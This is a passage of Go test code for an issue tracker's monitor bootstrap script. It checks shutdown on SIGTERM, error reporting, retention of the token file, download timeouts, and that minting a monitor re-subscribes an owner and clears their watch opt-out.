		case <-time.After(30 * time.Second):
			t.Fatalf("the runner never polled; lines so far: %v", first.all)
		}
		if err := syscall.Kill(-first.cmd.Process.Pid, syscall.SIGTERM); err != nil {
			t.Fatalf("SIGTERM: %v", err)
		}
		assertOneStopLine(t, first.rest(t), "stopped", "paused")
		if !fileExists(token) {
			t.Fatalf("token file removed after SIGTERM")
		}

		second := startBootstrap(t, command)
		if got := second.next(t); got["event"] != "monitor_started" {
			t.Fatalf("restart first line = %v, want monitor_started", got)
		}
		id := srv.push()
		got := second.next(t)
		n, _ := got["notification"].(map[string]any)
		if got["event"] != "notification" || n["id"] != float64(id) {
			t.Fatalf("restart delivered %v, want notification %d", got, id)
		}
	})

	t.Run("download failure is server_unreachable and keeps the file", func(t *testing.T) {
		srv := newBootstrapServer(t, runnerBody)
		srv.script = func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusInternalServerError) }
		token := newToken(t)
		run := startBootstrap(t, buildMonitorBootstrap(srv.srv.URL, "zz-24", "", token))
		assertOneStopLine(t, run.rest(t), "server_unreachable", "paused")
		if !fileExists(token) {
			t.Fatalf("token file removed on server_unreachable")
		}
	})

	t.Run("internal error of the runner body keeps the file", func(t *testing.T) {
		srv := newBootstrapServer(t, runnerBody)
		token := newToken(t)
		run := startBootstrap(t, buildMonitorBootstrap(srv.srv.URL, "zz-24", "", token),
			"PYTHONPATH="+site, "SKEIN_TEST_SITE=1", "SKEIN_TEST_RANDOM=raise")
		assertOneStopLine(t, run.rest(t), "internal_error", "paused")
		if !fileExists(token) {
			t.Fatalf("token file removed on internal_error")
		}
	})

	t.Run("the body download has a finite positive limit", func(t *testing.T) {
		release := make(chan struct{})
		srv := newBootstrapServer(t, runnerBody)
		srv.script = func(w http.ResponseWriter, r *http.Request) {
			select { // accept, never answer
			case <-release:
			case <-r.Context().Done():
			}
		}
		defer close(release)
		token := newToken(t)
		connectLog := filepath.Join(t.TempDir(), "connect")
		run := startBootstrap(t, buildMonitorBootstrap(srv.srv.URL, "zz-24", "", token),
			"PYTHONPATH="+site, "SKEIN_TEST_SITE=1", "SKEIN_TEST_CONNECT_LOG="+connectLog)
		lines := run.rest(t)
		_ = run.cmd.Wait()
		raw, err := os.ReadFile(connectLog)
		if err != nil {
			t.Fatalf("connection was never opened: %v", err)
		}
		log := string(raw)
		if strings.Contains(log, "violation") {
			t.Fatalf("the download read without a finite positive timeout:\n%s", log)
		}
		var timeout float64
		if _, err := fmt.Sscanf(log, "timeout %g", &timeout); err != nil || timeout <= 0 {
			t.Fatalf("recorded download timeout %q, want a finite positive value", log)
		}
		assertOneStopLine(t, lines, "server_unreachable", "paused")
		if code := run.cmd.ProcessState.ExitCode(); code != 1 {
			t.Fatalf("exit code = %d, want 1", code)
		}
		if !fileExists(token) {
			t.Fatalf("token file removed on a download timeout")
		}
	})
}

// TestGetMonitorScript_RemovesOptOut — sk-622.21, row No. 29 (decision R4,
// US-1 «a manual subscription deletes the opt-out»): the monitor's
// subscription is the owner's manual one, so minting a monitor on an issue
// the owner explicitly unwatched (subscription deleted, opt-out recorded)
// subscribes them again with reason manual and deletes the opt-out.
func TestGetMonitorScript_RemovesOptOut(t *testing.T) {
	pool := newTestPool(t)
	userID, _ := seedUser(t, pool, "user")
	pid, prefix := seedProject(t, pool, userID, "gmso")
	issueID := prefix + "-1"
	seedIssue(t, pool, pid, userID, issueID, "monitor after unwatch", "open", 2)
	keyID := seedAPIKeyForTool(t, pool, userID)
	notifStore := notifications.NewStore(pool)

	if err := notifStore.AddIssueWatch(context.Background(), issueID, userID, false); err != nil {
		t.Fatalf("watch: %v", err)
	}
	if err := notifStore.RemoveIssueWatch(context.Background(), issueID, userID); err != nil {
		t.Fatalf("unwatch: %v", err)
	}
	if !watchOptOutExists(t, pool, issueID, userID) || watchRowExists(t, pool, issueID, userID) {
		t.Fatalf("precondition: opt-out recorded and no subscription row")
	}

	handler := handleGetMonitorScript(pool, notifStore, monitorcreds.New(pool, 6*time.Hour), gmsTestPublicURL)
	req := mcpgo.CallToolRequest{}
	req.Params.Arguments = map[string]any{"id": issueID}
	res, err := handler(withCtxKey(userID, "user", keyID), req)
	if err != nil || res.IsError {
		t.Fatalf("skein_get_monitor_script failed: err=%v body=%s", err, extractToolJSON(t, res))
	}

	if watchOptOutExists(t, pool, issueID, userID) {
		t.Errorf("the monitor's subscription left the opt-out in place (R4: it is a manual subscription)")
	}
	var reasons []string
	if err := pool.QueryRow(context.Background(),
		`SELECT reasons FROM issue_watchers WHERE issue_id = $1 AND user_id = $2`, issueID, userID).Scan(&reasons); err != nil {
		t.Fatalf("the monitor did not subscribe the owner: %v", err)
	}
	if len(reasons) != 1 || reasons[0] != notifications.ReasonManual {
		t.Errorf("subscription reasons = %v, want [manual]", reasons)
	}
}
